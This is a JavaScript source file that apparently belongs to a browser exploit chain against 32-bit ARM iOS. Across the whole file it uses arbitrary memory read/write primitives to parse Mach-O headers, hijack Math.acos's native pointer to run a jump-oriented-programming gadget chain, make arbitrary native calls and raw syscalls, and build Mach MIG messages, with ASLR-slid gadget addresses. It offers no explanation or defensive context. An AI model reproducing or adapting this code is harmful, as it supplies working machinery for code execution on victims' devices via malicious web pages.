
var segment_command = function(ptr) {
    this.addr = (ptr & 0xffffffff) >>> 0;
    
    this.cmd = mem.read32(this.addr + 0x0);
    this.cmdsize = mem.read32(this.addr + 0x4);
    this.segname = util.js_str(this.addr + 0x8);
    this.vmaddr = mem.read32(this.addr + 0x18);
    this.vmsize = mem.read32(this.addr + 0x1c);
    this.fileoff = mem.read32(this.addr + 0x20);
    this.filesize = mem.read32(this.addr + 0x24);
    this.maxprot = mem.read32(this.addr + 0x28);
    this.initprot = mem.read32(this.addr + 0x2c);
    this.nsects = mem.read32(this.addr + 0x30);
    this.flags = mem.read32(this.addr + 0x34);
}

var load_command = function(ptr) {
    this.addr = (ptr & 0xffffffff) >>> 0;
    
    this.cmd = mem.read32(this.addr + 0x0);
    this.cmdsize = mem.read32(this.addr + 0x4);
}

var mach_header = function(ptr) {
    this.addr = (ptr & 0xffffffff) >>> 0;
    this.load_commands = [];
    
    this.magic = mem.read32(this.addr + 0x0);
    this.cputype = mem.read32(this.addr + 0x4);
    this.cpusubtype = mem.read32(this.addr + 0x8);
    this.filetype = mem.read32(this.addr + 0xc);
    this.ncmds = mem.read32(this.addr + 0x10);
    this.sizeofcmds = mem.read32(this.addr + 0x14);
    this.flags = mem.read32(this.addr + 0x18);
    
    if (this.ncmds >= 1) {
        var lc_addr = this.addr + 0x1c;
        
        for (var i = 0; i < this.ncmds; i++) {
            var cmd = new load_command(lc_addr);
            this.load_commands.push(cmd);
            lc_addr += cmd.cmdsize;
        }
    }
}

var util = {
    u32_f64_buf: undefined,
    u32_array: undefined,
    f64_array: undefined,
    call_gadget1: undefined,
    call_gadget2: undefined,
    call_gadget3: undefined,
    syscall_gadget: undefined,
    mach_msg_gadget: undefined,
    js_proto_lr: undefined,
    call_func_addr: undefined,
    call_jop_data: undefined,
    call_orig_data: undefined,

    u32: function(value) {
        if (value == undefined || value == null) value = 0;
        return ((value & 0xffffffff) >>> 0);
    },
    
    u2f: function(hi, lo) {
        util.u32_array[0] = hi;
        util.u32_array[1] = lo;
        return util.f64_array[0];
    },

    f2u: function(value) {
        util.f64_array[0] = value;
        return [util.u32_array[0], util.u32_array[1]];
    },
    
    cstr: function(str) {
        var size = str.length;
        var buf = new ArrayBuffer(size + 0x8);
        var dv = new DataView(buf);
        for (var i = 0; i < size; i++) {
            dv.setUint8(i, str.charCodeAt(i) & 0xFF);
        }

        var dv_addr = mem.addrof(dv);
        return mem.read32(dv_addr + 0x10);
    },

    js_str: function(addr, max) {
        var array = [];
        if (!max) max = 256;
        
        for (var i = 0; i < max; i++) {
            var char = mem.read8(addr + i);
            if (char == 0) break;
            array.push(char);
        }

        var data = new Uint8Array(array);
        return String.fromCharCode.apply(null, data);
    },
    
    create_data_buf: function(size) {
        var info = {};
        info.array_buf = new ArrayBuffer(size + 0x8);
        info.data = new DataView(info.array_buf);
        info.size = size;
        info.addr = mem.read32(mem.addrof(info.data) + 0x10);

        info.read = function(offset, size) {
            switch (size) {
                case 1: return this.data.getUint8(offset);
                case 2: return this.data.getUint16(offset, true);
                case 4: return this.data.getUint32(offset, true);
                default: return 0;
            }
        }

        info.write = function(offset, value, size) {
            switch (size) {
                case 1: this.data.setUint8(offset, value & 0xff); break;
                case 2: this.data.setUint16(offset, value & 0xffff, true); break;
                case 4: this.data.setUint32(offset, value & 0xffffffff, true); break;
                default: break;
            }
        }
        return info;
    },
    
    parse_arg: function(arg) {
        if (arg == undefined || arg == null) util.u32(0);
        return util.u32(arg);
    },

    call: function(target, a1, a2, a3, a4, a5, a6, r12) {
        if (util.call_jop_data == undefined) {
            util.call_func_addr = mem.addrof(Math.acos);
            util.call_orig_data = mem.read32(util.call_func_addr + 0x14);
            
            util.call_jop_data = util.create_data_buf(0x100);
            util.call_jop_data.write(0x00, util.call_jop_data.addr + 0x80, 0x4); // r3
            util.call_jop_data.write(0x04, util.call_jop_data.addr + 0x40, 0x4); // r5
            util.call_jop_data.write(0x08, mem.read32(util.call_orig_data + 0x8), 0x4); // r10
            util.call_jop_data.write(0x0c, 0, 0x4); // r11
            util.call_jop_data.write(0x10, 0, 0x4); // r12
            util.call_jop_data.write(0x14, util.js_proto_lr, 0x4); // lr
            util.call_jop_data.write(0x18, util.call_gadget2, 0x4); // pc
            util.call_jop_data.write(0x1c, mem.read32(util.call_orig_data + 0x1c), 0x4); // used by jsc
            util.call_jop_data.write(0x20, 0, 0x4); // used by jsc
            util.call_jop_data.write(0x24, util.call_gadget1, 0x4); // used by jsc
            
            util.call_jop_data.write(0x40, 0, 0x4); // r0 (arg1)
            util.call_jop_data.write(0x44, 0, 0x4); // r2 (arg3)
            util.call_jop_data.write(0x48, 0, 0x4); // r4 (arg5)
            util.call_jop_data.write(0x4c, 0, 0x4); // r5 (arg6)
            util.call_jop_data.write(0x50, 0, 0x4); // r8
            util.call_jop_data.write(0x54, 0, 0x4); // r11
            util.call_jop_data.write(0x58, 0, 0x4); // r12 (optional)
            util.call_jop_data.write(0x5c, util.call_gadget3, 0x4); // pc

            util.call_jop_data.write(0x80, 0, 0x4); // r1 (arg2)
            util.call_jop_data.write(0x84, 0, 0x4); // r3 (arg4)
            util.call_jop_data.write(0x88, 0, 0x4); // r9
            util.call_jop_data.write(0x8c, 0, 0x4); // r10
            util.call_jop_data.write(0x90, 0, 0x4); // pc (target)
        }

        util.call_jop_data.write(0x08, mem.read32(util.call_orig_data + 0x8), 0x4); // r10
        util.call_jop_data.write(0x1c, mem.read32(util.call_orig_data + 0x1c), 0x4); // used by jsc

        util.call_jop_data.write(0x40, util.parse_arg(a1), 0x4); // r0
        util.call_jop_data.write(0x80, util.parse_arg(a2), 0x4); // r1
        util.call_jop_data.write(0x44, util.parse_arg(a3), 0x4); // r2
        util.call_jop_data.write(0x84, util.parse_arg(a4), 0x4); // r3
        util.call_jop_data.write(0x48, util.parse_arg(a5), 0x4); // r4
        util.call_jop_data.write(0x4c, util.parse_arg(a6), 0x4); // r5
        util.call_jop_data.write(0x58, util.parse_arg(r12), 0x4); // r12
        util.call_jop_data.write(0x90, util.u32(target), 0x4); // pc

        mem.write32(util.call_func_addr + 0x14, util.call_jop_data.addr);
        var value_f64 = Math.acos(1.1);
        mem.write32(util.call_func_addr + 0x14, util.call_orig_data);
        return util.f2u(value_f64)[0];
    },

    
    syscall: function(sys_num, a1, a2, a3, a4, a5, a6, a7) {
        sys_num = util.u32(sys_num);
        if (sys_num == 0xFFFFFFE1) { // special case for mach_msg
            var data = util.create_data_buf(0x10);
            data.write(0x0, util.parse_arg(a5), 0x4);
            data.write(0x4, util.parse_arg(a6), 0x4);
            data.write(0x8, util.parse_arg(a7), 0x4);
            return util.call(util.mach_msg_gadget, a1, a2, a3, a4, 0, 0, data.addr)
        }
        return util.call(util.syscall_gadget, a1, a2, a3, a4, a5, a6, sys_num);
    },
    
    mig_setup: function(id, request_size, reply_size, remote_port, complex) {
        var msg_size = ((request_size > reply_size) ? request_size : reply_size) + 0x10;
        var msg = util.create_data_buf(msg_size);
        msg.request_size = request_size;
        msg.reply_size = reply_size;
        
        msg.write(offsets.mach_msg_hdr.msgh_bits, (complex ? 0x80001513 : 0x1513), 0x4);
        msg.write(offsets.mach_msg_hdr.msgh_size, request_size, 0x4);
        msg.write(offsets.mach_msg_hdr.msgh_remote_port, remote_port, 0x4);
        msg.write(offsets.mach_msg_hdr.msgh_local_port, sys.mach_reply_port(), 0x4);
        msg.write(offsets.mach_msg_hdr.msgh_id, id, 0x4);
        msg.write(0x18, 0, 0x4);
        return msg;
    },

    mig_set_descriptor: function(msg, offset, port) {
        msg.write(offset+0x0, port, 0x4);
        msg.write(offset+0x4, 0x00000000, 0x4);
        msg.write(offset+0x8, 0x00130000, 0x4);
        msg.write(0x18, 1, 0x4);
    },

    mig_set_ndr: function(msg, offset) {
        msg.write(offset+0x0, 0x00000000, 0x4);
        msg.write(offset+0x4, 0x00000001, 0x4);
    },

    mig_send: function(msg) {
        var port = msg.read(offsets.mach_msg_hdr.msgh_local_port, 0x4);
        return sys.mach_msg(msg.addr, 3, msg.request_size, msg.reply_size, port, 0, 0);
    },
    
    init: function() {
        util.u32_f64_buf = new ArrayBuffer(0x8);
        util.u32_array = new Uint32Array(util.u32_f64_buf);
        util.f64_array = new Float64Array(util.u32_f64_buf);

        util.call_gadget1 = dyld.remap_addr(info.gadgets.ldm_r1_r3_r5_r10_r11_r12_lr_pc);
        util.call_gadget2 = dyld.remap_addr(info.gadgets.ldm_r5_r0_r2_r4_r5_r8_r11_r12_pc);
        util.call_gadget3 = dyld.remap_addr(info.gadgets.ldm_r3_r1_r3_r9_r10_pc);
        util.syscall_gadget = dyld.remap_addr(info.gadgets.svc_0x80_bx_lr);
        util.mach_msg_gadget = dyld.remap_addr(info.symbols.mach_msg_trap);
        util.js_proto_lr = dyld.slide_addr(info.gadgets.js_proto_lr);
    }
};
